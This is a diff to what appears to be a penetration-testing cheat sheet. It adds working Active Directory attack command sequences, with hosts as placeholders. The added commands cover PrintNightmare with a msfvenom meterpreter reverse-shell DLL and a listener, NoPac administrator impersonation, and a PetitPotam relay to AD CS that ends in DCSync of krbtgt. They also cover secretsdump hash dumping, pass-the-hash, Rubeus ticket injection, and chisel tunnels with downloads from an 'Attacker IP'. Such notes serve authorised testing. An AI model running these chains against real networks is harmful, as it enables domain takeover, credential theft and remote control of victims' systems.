@@ -68,14 +68,17 @@ https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.managem
 https://humdi.net/vnstat/
 
 - Attack
-[SAM Name impersonation](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)
+- [SAM Name impersonation](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699)
 [CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
-[CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
-[NoPac](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
-[CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)
-[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
-[CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)
-[NTLM relaying to AD CS and the PetitPotam attack](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
+- [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
+- [NoPac](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
+- [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)
+- [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
+- [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)
+- [NTLM relaying to AD CS and the PetitPotam attack](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
+- [Whitepaper Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+Exchange-AD-Privesc
+- [MS-PRN Printer Bug. ](https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/)
 
 - EyeWitness
 EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
@@ -207,6 +210,16 @@ $ ssh TestUser@XXX.XXX.XXX.XXX -R 8888:TestHost.HOGE.com:80 -L *:6666:127.0.0.1:
 $ socat TCP4-LISTEN:13514,fork TCP4:TestTargetHost.HOGE.com:3389
 ```
 
+# chisel
+```zsh
+$ chisel_1.9.1_linux_amd64 server -p 8000 --reverse
+PS> c:\chisel client XXX.XXX.XXX.XXX:8000 R:socks
+PS> c:\chisel client XXX.XXX.XXX.XXX:8000 R:5002:socks
+# sudo vim /etc/proxychains4.conf
+## socks5 	127.0.0.1 5000
+# proxychains4 psexec.py HOGE.COM/TestUser:TestPassword@XXX.XXX.XXX.XXX
+```
+
 # TFTP
 ```zsh
 $ tftp -i XXX.XXX.XXX.XXX GET "\Tmp\x64{8A98E259-D569-5C1B-A098-986F5B5736FF}.bcd" conf.bcd
@@ -325,6 +338,7 @@ $ set +H
 $ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups
 $ sudo crackmapexec smb XXX.XXX.XXX.XXX -u valid_users.txt -p TestPasseord | grep +
 $ sudo crackmapexec smb --local-auth XXX.XXX.XXX.XXX/23 -u administrator -H TestNTLMhash | grep +
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u administrator -H TestNTLMhash
 ```
 
 # smbmap
@@ -406,6 +420,11 @@ PS> Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }
 # check process
 command prompt> tasklist | findstr "calc"
 PS> Get-Process | Where-Object { $_.Name -like "*calc*"}
+# check memory cache about tgt
+PS> klist
+PS> klist tgt
+# delete memory cache
+PS> klist purge
 # find a specific folder
 PS> tree c:\
 PS> tree c:\ /f | more
@@ -887,7 +906,7 @@ PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argum
 # pth-tookit
 https://github.com/byt3bl33d3r/pth-toolkit
 
-# mimikatz
+# Mimikatz
 ```zsh
 PS> mimikatz.exe
 mimikatz# privilege::debug
@@ -908,6 +927,7 @@ mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /rc4:TestRc4Hash /run:"c
 mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /ntlm:TestNtlmHash /run:powershell
 mimikatz# lsadump::lsa /inject /name:TestUser
 mimikatz# lsadump::dcsync /user:hoge\TestUser
+mimikatz# lsadump::dcsync /user:hoge\krbtgt
 mimikatz# lsadump::dcsync /domain:HOGE.COM /user:HOGE\administrator
 mimikatz# misc::skelton
 ```
@@ -924,6 +944,7 @@ PS> Rubeus.exe kerberoast /outfile:hashes.txt
 PS> Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 PS> Rubeus.exe kerberoast /user:testspn /nowrap
 PS> Rubeus.exe asreproast
+PS> Rubeus.exe asktgt /user:TEST-DC01$ /certificate:TestBase64EncodedText /ptt
 ```
 ```zsh
 $ vim Rubeus_asreproast_TestUser_hash.txt
@@ -1035,6 +1056,7 @@ $ smbserver.py -smb2support -username TestUser -password TestPassword TestRemote
 $ secretsdump.py -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
 $ secretsdump.py -just-dc-user TestUser HOGE.com/TestUser:"TestPassword\!"@XXX.XXX.XXX.XXX
 $ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
+$ secretsdump.py -just-dc-user HOGE/administrator "Test-DC1$"@XXX.XXX.XXX.XXX -hashes TestNtHash:TestLmHash
 $ secretsdump.py -sam sam.hive -system system.hive LOCAL
 $ ls hoge-com_hashes*
 ```
@@ -1059,6 +1081,16 @@ $ mssqlclient.py HOGE/TestUser@XXX.XXX.XXX.XXX -windows-auth
 SQL> help
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami /priv
+```
+## gettgtpkinit.py 
+```zsh
+$ gettgtpkinit.py HOGE.COM/TestADHost\$ -pfx-base64 TestBase64EncodedText TestDC.ccache
+$ export KRB5CCNAME=TestDC.ccache
+$ secretsdump.py -just-dc-user HOGE/administrator -k -no-pass "TestADHost$"@TestADHost.HOGE.COM
+```
+## getnthash.py
+```zsh
+$ getnthash.py -key TestNtHash HOGE.COM/Test-AD-Host$
 ```
 
 # Evil-WinRM
@@ -1134,6 +1166,14 @@ $ python3 PetitPotam.py XXX.XXX.XXX.XXX YYY.YYY.YYY.YYY
 # certi
 https://github.com/zer1t0/certi
 locate CA
+
+# Get-SpoolStatus.ps1
+https://github.com/NotMedic/NetNTLMtoSilverTicket
+tag: Enumerating for MS-PRN Printer Bug
+```powershell
+PS> Import-Module .\SecurityAssessment.ps1
+PS> Get-SpoolStatus -ComputerName TEST-DC01.HOGE.COM
+```
 
 # SharpGPOAbuse
 
@@ -1213,6 +1253,65 @@ $ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > TestU
 $ cat TestUser_tgs_hashcat
 $krb5tgs$23$*TestUser.kirbi*$aaaa....$bbbb....
 $ hashcat -m 13100 TestUser_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+```
+## chisel delivery
+```zsh
+# XXX.XXX.XXX.XXX : Attacker IP
+PS> Invoke-WebRequest -Uri http://XXX.XXX.XXX.XXX:80/chisel.exe
+# error
+PS> Invoke-WebRequest -Uri http://XXX.XXX.XXX.XXX:80/chisel.exe -OutFile C:\chisel.exe
+# ok
+```
+
+## NoPac
+```zsh
+$ scanner.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -use-ldap
+$ noPac.py hoge.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX  -dc-host TEST-DC01 -shell --impersonate administrator -use-ldap
+$ ls
+administrator_DC01.hoge.com.ccache  noPac.py   requirements.txt  utils
+README.md  scanner.py
+```
+## PrintNightmare
+```zsh
+$ pip3 uninstall impacket
+$ git clone https://github.com/cube0x0/impacket
+$ cd impacket
+$ ./setup.py install
+$ rpcdump.py @XXX.XXX.XXX.XXX | egrep 'MS-RPRN|MS-PAR'
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YYY.YYY.YYY.YYY LPORT=8080 -f dll > testscript.dll
+$ smbserver.py -smb2support TestShare /path/to/testscript.dll
+Bleeding Edge Vulnerabilities
+$ msfconsole
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST YYY.YYY.YYY.YYY
+LHOST => 10.3.88.114
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
+LPORT => 8080
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+#
+$ CVE-2021-1675.py hoge.com/TestUser:TestPassword@XXX.XXX.XXX.XXX '\\YYY.YYY.YYY.YYY\TestShare\testscript.dll'
+#
+(Meterpreter 1)(C:\Windows\system32) > shell
+```
+## PetitPotam
+```zsh
+$ ntlmrelayx.py -debug -smb2support --target http://TEST-CA01.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
+$ PetitPotam.py YYY.YYY.YYY.YYY XXX.XXX.XXX.XXX
+$ ntlmrelayx.py -debug -smb2support --target http://TEST-CA01.HOGE.COM/certsrv/certfnsh.asp --adcs --template DomainController
+$ gettgtpkinit.py HOGE.COM/TEST-DC01\$ -pfx-base64 TestBase64EncodedText TestDc01.ccache
+$ export KRB5CCNAME=TestDc01.ccache
+$ secretsdump.py -just-dc-user HOGE/administrator -k -no-pass "TEST-DC01$"@TEST-DC01.HOGE.COM
+$ klist
+$ crackmapexec smb XXX.XXX.XXX.XXX -u administrator -H TestNtHash
+$ getnthash.py -key TestNtHash HOGE.COM/TEST-DC01$
+$ secretsdump.py -just-dc-user HOGE/administrator "TEST-DC01$"@XXX.XXX.XXX.XXX -hashes TestNtHash:TestLmHash
+PS> .\Rubeus.exe asktgt /user:TEST-DC01$ /certificate:TestBase64EncodedText /ptt
+PS> klist
+PS> .\mimikatz.exe
+mimikatz# lsadump::dcsync /user:hoge\krbtgt
 ```
 
 # config
